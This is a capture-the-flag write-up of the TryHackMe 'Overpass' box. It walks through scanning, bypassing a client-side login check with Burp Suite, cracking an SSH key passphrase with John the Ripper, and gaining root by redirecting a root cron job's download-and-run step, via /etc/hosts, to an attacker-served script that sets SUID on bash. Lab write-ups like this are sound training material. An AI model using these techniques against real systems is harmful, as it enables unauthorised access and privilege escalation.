Recently, I decided to give the Overpass box a try on TryHackMe as it has been on my bucketlist for a quite while now. This is my writeup for the particular box.
I started my testing with a simple nmap scan using:
`nmap -sC -sV -oN nmapscan.txt 10.10.38.213 -v`
Here is the output of the nmap scan:
```

The box looked relatively simple with port 22 open for SSH connections and port 80 open for HTTP traffic. I decided to enumerate the website running on port 80 since SSH is not a great target to start with. I left gobuster running on the background busting through all the sub-directories, while I manually looked around the website. For gobsuter I used the following command:
`gobuster dir -u http://10.10.38.213/ -t 100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .txt,.html,.php,.js`
The output for the above command was:

What particularly seemed interesting from the gobsuter results were `login.js` and the admin login panel at `/admin`. Regardless, I went on to the website and took a look. It looked something like this:

![home page](images/home.png) 

The about page had some interesting names which could potentially have been used as usernames for authentication later on, but aside from that nothing really caught my eye on this page: 

![about page](images/about.png)

I moved on to the downloads section which had some interesting stuff going on with it:

![download page](images/downloads.png)

The source code for the binary seemed awfully interesting but on manual review, nothing seemed off about it except the fact that it was using ROT47 in the name of military grade encryption LOL.
Since nothing seemed off uptil now, I went on to the more concerning parts namely the `login.js` file. Upon a closer inspection I found a vulnerable function in `login.js`.

![login.js](images/login.png)

Do you see it? Look at:
```
async function login() {
    const usernameBox = document.querySelector("#username");
    const passwordBox = document.querySelector("#password");
    const loginStatus = document.querySelector("#loginStatus");
    loginStatus.textContent = ""
    const creds = { username: usernameBox.value, password: passwordBox.value }
    const response = await postData("/api/login", creds)
    const statusOrCookie = await response.text()
    if (statusOrCookie === "Incorrect credentials") {
        loginStatus.textContent = "Incorrect Credentials"
        passwordBox.value=""
    } else {
        Cookies.set("SessionToken",statusOrCookie)
        window.location = "/admin"
    }
}
```
We can bypass the `if` check easily by using an HTTP proxy like `BurpSuite`. So, naturally I opened up BurpSuite and intercepted the request for the login on `/admin`, then I had to intercept the response by setting capture response to this request to true.

![capture response](images/burp.png)

Simply removing the `Incorrect Credentials` would allow us bypass the check in the login function above. And that is exactly what I did.

![incorrect credentials](images/inc%20cred.png)
![no credential](images/no%20cred.png)

I refreshed the page after this and I had successfully bypassed the login. The new page presented me with an RSA private key.

![RSA Key](images/RSA.png)

I copied the key and saved it in a file. I ran `chmod 600` on the file to give it the proper permissions. Now I had to crack the passphrase for the key. I achieved this buy using `ssh2john` and `johntheripper`. First I ran `ssh2john RSA > johnrsa` and then I ran `john --wordlist=/usr/share/wordlists/rockyou.txt johnrsa`. The cracked passphrase turned out to be `james13`, and with this credential I was successfully able to ssh into the box by running `ssh -i RSA james@10.10.38.213` and supplying the password. 

![user shell via ssh](images/user%20shell.png)

SSH gave me the initial user shell but the real fun began with privilege escalation. Manually looking around seemed redundant at first glance, so I grabbed a copy of `linpeas.sh` and served it to the box using a `python -m http.server 80`.

![http server](images/http.png) 
![linpeas](images/linpeas.png)

Upon running `linpeas.sh` a peculiar cron job came under my attention. 

![cron job](images/cron.png)

This job was running every mintue with root privileges, it was basically downloading a file present in the given path `overpass.thm/downloads/src/buildscript.sh` and piping it to bash. The cherry on top was the file used to resolve a particular IP address to `overpass.thm` namely the `/etc/hosts` file was writeable by the current user according to linpeas.sh.

![/etc/hosts](images/etc.png)

So I opened up the `hosts` file and made it so that `overpass.thm` resolved to my `tun0` IP (OpenVPN IP).

![edit](images/edit.png)

Now I went into the directory where I had the python http server running and recreated the path in the job namely `/downloads/src`. In the context of the path, I made my own malicious `buildscript.sh` with the following code:
```
#!/bin/bash
chmod +s /bin/bash
```
The idea here was to set the SUID bit for /bin/bash as the `root` user so anybody with an user account could run `/bin/bash` with elevated root privileges. After a one minute wait, the job ran as expected and my malicious script was run by the `root` user. Finally, a simple `/bin/bash -p` gave me access to a root shell and I had officially rooted the box.
